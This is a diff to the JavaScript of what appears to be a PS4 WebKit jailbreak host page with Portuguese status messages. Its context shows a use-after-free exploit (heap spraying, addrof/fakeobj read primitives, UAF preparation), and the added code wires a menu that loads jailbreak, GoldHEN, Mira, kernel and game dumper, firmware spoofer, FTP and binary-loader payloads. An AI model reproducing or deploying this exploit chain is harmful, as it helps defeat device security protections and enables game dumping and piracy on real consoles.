@@ -114,12 +114,122 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("[+] Succesfully got addrof/fakeobj");
+	if(localStorage.autoExploit=="true")
+		debug_log("Webkit Executado com <font color=\"#00FF12\">SUCESSO!!</font>, Executando Jailbreak e <font color=\"#F3D400\">GOLDHEN</font>... <font color=\"#F00\">AGUARDE!!!</font>");
+	else
+		debug_log("Webkit Executado com <font color=\"#00FF12\">SUCESSO!!</font>, Agora Execute o Jailbreak...");
 
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
 		window.postExploit();
+
+}
+
+function toggle_payload(pld){
+	if(pld == "exploit"){
+		document.getElementById("progress").innerHTML="Realizando o Jailbreak.. <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['jb/jb.js']);
+	}else if(pld == "exploit_old"){
+		document.getElementById("progress").innerHTML="Realizando o Jailbreak.. <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['jb/oldjb.js']);
+	}else if(pld == "binloader"){
+		document.getElementById("progress").innerHTML="Aguardando o envio do arquivo .BIN para a porta 9021.";
+		preloadScripts(['payloads/preloader.js', 'payloads/loader.js']);
+	}else if(pld == "mira75X"){
+		document.getElementById("progress").innerHTML="Carregando <font color=\"#001EFF\">MIRA</font>... <font color=\"#F00\">AGUARDE!!!</font>";
+		if(fw=="755"){
+			preloadScripts(['payloads/preloader.js', 'payloads/mira755.js', 'payloads/loader.js']);
+		}else{
+			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/mira'+fw+'.js', 'payloads/loader.js']);	
+		}
+	}else if(pld == "mira2b"){
+		document.getElementById("progress").innerHTML="Carregando <font color=\"#001EFF\">MIRA-B</font> com <font color=\"#FF7E00\">SPOOFER</font>... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/mira2b.js', 'payloads/loader.js']);
+	}else if(pld == "ftp"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Iniciando FTP, Acesse pela porta 1337."; }, 7000);
+		preloadScripts(['payloads/preloader.js', 'payloads/ftp.js', 'payloads/loader.js']);
+	}else if(pld == "app2usb"){
+		document.getElementById("progress").innerHTML="Carregando APP-TO-USB... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/app2usb.js', 'payloads/loader.js']);
+	}else if(pld == "disableupdates"){
+		document.getElementById("progress").innerHTML="Desabilitando Updates... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/disableupdates.js', 'payloads/loader.js']);
+	}else if(pld == "enableupdates"){
+		document.getElementById("progress").innerHTML="Habilitando Updates... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/enableupdates.js', 'payloads/loader.js']);
+	}else if(pld == "backup"){
+		document.getElementById("progress").innerHTML="Iniciando Backup do PS4... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/backup.js', 'payloads/loader.js']);
+	}else if(pld == "restore"){
+		document.getElementById("progress").innerHTML="Restaurando Backup do PS4... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/restore.js', 'payloads/loader.js']);
+	}else if(pld == "rifrenamer"){
+		document.getElementById("progress").innerHTML="Carregando Rif-Renamer... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/rifrenamer.js', 'payloads/loader.js']);
+	}else if(pld == "todex"){
+		document.getElementById("progress").innerHTML="Carregando TO-DEX... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/todex.js', 'payloads/loader.js']);
+	}else if(pld == "dumper"){
+		document.getElementById("progress").innerHTML="Iniciando Dumper de Jogos... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/dumper.js', 'payloads/loader.js']);
+	}else if(pld == "disableaslr"){
+		document.getElementById("progress").innerHTML="Carregando Desabilitar ASLR... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/disableaslr.js', 'payloads/loader.js']);
+	}else if(pld == "kerneldumper"){
+		document.getElementById("progress").innerHTML="Iniciando Dumper do Kernel... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/kerneldumper.js', 'payloads/loader.js']);
+	}else if(pld == "kernelclock"){
+		document.getElementById("progress").innerHTML="Iniciando Dumper do Clock... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/kernelclock.js', 'payloads/loader.js']);
+	}else if(pld == "fancontrol"){
+		document.getElementById("progress").innerHTML="Iniciando Controle da FAN... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/fancontrol.js', 'payloads/loader.js']);
+	}else if(pld == "enablebrowser"){
+		document.getElementById("progress").innerHTML="Habilitando Historico Browser... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/enablebrowser.js', 'payloads/loader.js']);
+	}else if(pld == "historyblocker"){
+		document.getElementById("progress").innerHTML="Desabilitando Historico Browser... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/historyblocker.js', 'payloads/loader.js']);
+	}else if(pld == "exitidu"){
+		document.getElementById("progress").innerHTML="Iniciando EXIT-IDU... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/exitidu.js', 'payloads/loader.js']);
+	}else if(pld == "ps4debug"){
+		document.getElementById("progress").innerHTML="Iniciando PS4 Debug... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/ps4debug.js', 'payloads/loader.js']);
+	}else if(pld == "goldhen"){
+		document.getElementById("progress").innerHTML="Carregando <font color=\"#F3D400\">GOLDHEN V1.0</font>... <font color=\"#F00\">AGUARDE!!!</font>";
+		if(fw=="755"){
+			preloadScripts(['payloads/preloader.js', 'payloads/goldhen755.js', 'payloads/loader.js']);
+		}else{
+			preloadScripts(['payloads/preloader'+fw+'.js', 'payloads/goldhen'+fw+'.js', 'payloads/loader.js']);	
+		}
+	}else if(pld == "webrte"){
+		document.getElementById("progress").innerHTML="Carregando WEB-RTE... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/webrte.js', 'payloads/loader.js']);
+	}else if(pld == "spoofer"){
+		document.getElementById("progress").innerHTML="Carregando SPOOFER FW V8.03... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/spoof.js', 'payloads/loader.js']);
+	}else if(pld == "lamance132"){
+		document.getElementById("progress").innerHTML="Carregando MOD GTA-V Lamance V1.32... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/lamance132.js', 'payloads/loader.js']);
+	}else if(pld == "linux1gb"){
+		document.getElementById("progress").innerHTML="Carregando LINUX 1GB... <font color=\"#F00\">AGUARDE!!!</font>";
+		preloadScripts(['payloads/preloader.js', 'payloads/linux1g.js', 'payloads/loader.js']);
+	}
+	if(window.postPayload)
+		window.postPayload();
+	payload_finished(pld);
+	
+}
+
+function payload_finished(payload)
+{
+	if(payload == "binloader"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Aguardando o envio do arquivo .BIN para a porta 9021"; }, 7000);
+	} else if(payload != "exploit" && payload != "exploit_old"){
+		setTimeout(function(){document.getElementById("progress").innerHTML="Desbloqueio Realizado Com <font color=\"#00FF12\">SUCESSO!!</font> Bons Jogos!!"; }, 7000);
+	}
 }
 
 function read(addr, length) {
@@ -308,7 +418,7 @@ function confuseTargetObjRound1() {
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
 	 * the next 5s
 	 */
-	setTimeout(leakJSC, 6000);
+	setTimeout(function(){leakJSC();}, 6000);
 }
 
 function handle2() {
@@ -413,7 +523,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = document.createElement("div");
+	let textarea_div_elem = window.xyu = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
@@ -425,7 +535,7 @@ function sprayHTMLTextArea() {
 	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
 	 * allocation of the node attributes and an IsoHeap allocation of the
 	 * Element. The virtual page layout will look something like that:
-	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
+	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...] DARKMODDER
 	 */
 	for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
 		textarea_div_elem.appendChild(element.cloneNode());
@@ -440,13 +550,15 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	/* Init spray */
-	sprayHTMLTextArea();
+	if(localStorage.is75XV2Cached){
+		/* Init spray */
+		sprayHTMLTextArea();
 
-	if(window.midExploit)
-		window.midExploit();
+		if(window.midExploit)
+			window.midExploit();
 
-	g_input = input1;
-	/* Shape heap layout for obj. reuse */
-	prepareUAF();
+		g_input = input1;
+		/* Shape heap layout for obj. reuse */
+		prepareUAF();
+	}
 }
